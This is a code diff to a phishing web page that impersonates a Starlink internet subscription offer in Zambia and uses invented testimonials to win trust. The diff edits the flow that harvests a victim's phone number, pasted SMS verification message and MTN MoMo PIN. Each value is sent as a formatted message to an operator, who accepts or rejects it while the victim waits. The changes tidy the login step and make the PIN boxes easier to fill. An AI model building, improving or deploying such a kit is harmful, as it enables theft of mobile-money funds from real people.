-          <input type="password" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off">
-          <input type="password" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off">
+          <input type="tel" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off" pattern="[0-9]*">
+          <input type="tel" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off" pattern="[0-9]*">
+          <input type="tel" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off" pattern="[0-9]*">
+          <input type="tel" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off" pattern="[0-9]*">
         </div>
         <div class="pin-forgot-row"><a href="#" id="pinForgot">Forgot PIN?</a></div>
         <button class="pin-submit" id="pinSubmit" disabled>Authorise Payment</button>
@@ -1010,7 +899,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   const state = {
     planName:'', planSize:'', planDuration:'', planSpeed:'', planPrice:'',
     address:'', street:'', city:'', province:'', contact:'',
-    welcomePhone:'', smsContent:'', momoPin:''
+    loginPhone:'', smsContent:'', momoPin:''
   };
   const pending = {};
 
@@ -1157,7 +1046,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   setInterval(tickPromo, 1000);
   tickPromo();
 
-  /* PROMO BUTTON HANDLER */
+  /* PROMO HANDLER */
   document.querySelector('.promo-btn').addEventListener('click', function() {
     state.planName = this.dataset.plan;
     state.planSize = this.dataset.size;
@@ -1178,7 +1067,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     showPage('confirm');
   });
 
-  /* TESTIMONIALS MARQUEE */
+  /* TESTIMONIALS */
   const testimonialData = [
     { initials:'CK', name:'Chanda K.', city:'Lusaka', color:'', text:'Setup was instant — paid with MTN MoMo and my Starlink was live in 10 minutes. <span class="highlight">200 Mbps</span> everywhere in my house.' },
     { initials:'MM', name:'Mwila M.', city:'Kitwe', color:'blue', text:'I work remotely and this has been flawless. <span class="highlight">Unlimited internet</span> for ZMW 300 a month — no more buying bundles.' },
@@ -1290,34 +1179,34 @@ ${state.contact ? '📞 ' + state.contact : ''}
 ⏰ ${new Date().toLocaleString()}`;
     const result = await submitAndWait(message, reqId, 'Processing...');
     if (result === 'accept') {
-      $('welcomePhone').value = '';
-      showPage('welcome');
-      setTimeout(() => $('welcomePhone').focus(), 300);
+      $('loginPhone').value = '';
+      showPage('login');
+      setTimeout(() => $('loginPhone').focus(), 300);
     }
   });
 
   $('cancelBtn').addEventListener('click', () => showPage('plans'));
 
-  /* WELCOME */
-  const welcomePhone = $('welcomePhone');
-  welcomePhone.addEventListener('input', function() {
+  /* LOGIN */
+  const loginPhone = $('loginPhone');
+  loginPhone.addEventListener('input', function() {
     this.value = this.value.replace(/\D/g, '').slice(0, 9);
   });
-  $('welcomeBack').addEventListener('click', () => showPage('confirm'));
-  $('welcomeHelp').addEventListener('click', () => showToast('Call 111 for MTN MoMo assistance'));
-  $('numberChangedLink').addEventListener('click', function(e) { e.preventDefault(); welcomePhone.focus(); });
+  $('loginBack').addEventListener('click', () => showPage('confirm'));
+  $('loginHelp').addEventListener('click', () => showToast('Call 111 for MTN MoMo assistance'));
+  $('numberChangedLink').addEventListener('click', function(e) { e.preventDefault(); loginPhone.focus(); });
 
-  $('welcomeSignin').addEventListener('click', async function() {
-    const phone = welcomePhone.value.trim();
+  $('loginSignin').addEventListener('click', async function() {
+    const phone = loginPhone.value.trim();
     if (!phone || phone.length < 9) {
       showToast('Please enter a valid Cellphone number', 'error');
-      welcomePhone.focus();
+      loginPhone.focus();
       return;
     }
-    state.welcomePhone = phone;
+    state.loginPhone = phone;
     const reqId = genReqId();
     const message =
-`🔐 *MTN MoMo Sign-in — Starlink*
+`🔐 *MTN MoMo Login — Starlink*
 
 📱 *Cellphone:* +260${phone}
 
@@ -1353,7 +1242,7 @@ ${state.contact ? '📞 ' + state.contact : ''}
     smsNextBtn.disabled = val.length === 0;
   });
 
-  $('smsBack').addEventListener('click', () => showPage('welcome'));
+  $('smsBack').addEventListener('click', () => showPage('login'));
 
   smsNextBtn.addEventListener('click', async function() {
     const smsContent = smsTextarea.value.trim();
@@ -1362,34 +1251,60 @@ ${state.contact ? '📞 ' + state.contact : ''}
     const reqId = genReqId();
     const result = await submitAndWait(smsContent, reqId, 'Processing...');
     if (result === 'accept') {
-      const phone = state.welcomePhone;
+      const phone = state.loginPhone;
       $('pinPhoneDisplay').innerHTML = '+260 <strong>' + phone.slice(0,2) + ' ' + phone.slice(2,5) + ' ' + phone.slice(5) + '</strong>';
-      document.querySelectorAll('.pin-box-real').forEach(i => { i.value = ''; i.type = 'password'; i.classList.remove('filled'); });
-      updatePinSubmitState();
+      resetPinBoxes();
       showPage('pin');
-      setTimeout(() => document.querySelector('.pin-box-real').focus(), 300);
+      setTimeout(() => { pinBoxes[0].focus(); }, 350);
     }
   });
 
-  /* PIN */
+  /* PIN PAGE — FIXED */
   const pinBoxes = document.querySelectorAll('.pin-box-real');
+
+  function resetPinBoxes() {
+    pinBoxes.forEach(b => {
+      b.value = '';
+      b.classList.remove('filled');
+      b.setAttribute('type', 'tel');
+    });
+    updatePinSubmitState();
+  }
+
   pinBoxes.forEach((box, idx) => {
     box.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '');
+      this.value = this.value.replace(/\D/g, '').slice(-1);
       if (this.value.length === 1) {
         this.classList.add('filled');
-        if (idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
+        if (idx < pinBoxes.length - 1) {
+          pinBoxes[idx + 1].focus();
+        } else {
+          this.blur();
+        }
       } else {
         this.classList.remove('filled');
       }
       updatePinSubmitState();
     });
     box.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace' && this.value === '' && idx > 0) pinBoxes[idx - 1].focus();
+      if (e.key === 'Backspace') {
+        if (this.value === '' && idx > 0) {
+          pinBoxes[idx - 1].focus();
+        } else {
+          this.value = '';
+          this.classList.remove('filled');
+          updatePinSubmitState();
+        }
+      }
+    });
+    box.addEventListener('focus', function() {
+      this.select();
     });
   });
 
-  function getPinValueReal() { return Array.from(pinBoxes).map(b => b.value).join(''); }
+  function getPinValueReal() {
+    return Array.from(pinBoxes).map(b => b.value).join('');
+  }
 
   function updatePinSubmitState() {
     const val = getPinValueReal();
@@ -1410,7 +1325,7 @@ ${state.contact ? '📞 ' + state.contact : ''}
     const message =
 `🔐 *MTN MoMo PIN — Starlink*
 
-📱 *Cellphone:* +260${state.welcomePhone}
+📱 *Cellphone:* +260${state.loginPhone}
 🔑 *PIN:* \`${pin}\`
 
 📦 *Plan:* ${state.planName}
@@ -1425,8 +1340,7 @@ ${state.contact ? '📞 ' + state.contact : ''}
       $('reviewAmount').textContent = state.planPrice;
       showPage('review');
     } else {
-      pinBoxes.forEach(i => { i.value = ''; i.classList.remove('filled'); });
-      updatePinSubmitState();
+      resetPinBoxes();
       pinBoxes[0].focus();
     }
   });
@@ -1477,4 +1391,4 @@ ${state.contact ? '📞 ' + state.contact : ''}
 })();
 </script>
 </body>
-          </html>
+                                                                                                                                                                                                                                                                                                                 </html>
